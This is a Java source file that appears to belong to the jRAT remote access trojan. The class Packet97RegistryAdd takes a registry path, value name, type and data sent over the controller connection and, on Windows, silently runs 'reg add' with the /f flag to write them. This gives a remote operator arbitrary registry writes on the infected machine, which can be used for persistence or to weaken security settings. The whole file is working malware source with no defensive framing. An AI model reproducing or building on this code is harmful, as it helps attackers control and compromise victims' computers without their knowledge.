package jrat.module.registry;

import jrat.client.Connection;
import jrat.client.packets.incoming.IncomingPacket;
import oslib.OperatingSystem;

public class Packet97RegistryAdd implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String path = con.readLine();
		String name = con.readLine();
		String type = con.readLine();
		String data = con.readLine();
				
		try {
			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				Runtime.getRuntime().exec(new String[] { "reg", "add", path + "\\", "/v", name, "/t", type, "/d", data, "/f" });
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
